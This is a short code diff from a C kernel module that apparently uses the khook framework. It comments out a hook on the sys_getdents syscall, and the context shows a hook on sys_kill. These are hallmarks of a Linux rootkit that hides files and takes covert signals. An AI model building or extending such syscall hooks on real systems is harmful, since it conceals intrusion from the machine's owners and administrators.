@@ -203,9 +203,9 @@ static long khook_sys_kill(pid_t pid, int sig) {
 }
 
 
-KHOOK(sys_getdents);
+/*KHOOK(sys_getdents);
 static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count){
-	long value=0;
+	long value=0;*/
 // 　　struct inode *dinode;
 // 　　int len = 0;
 // 　　int tlen = 0;
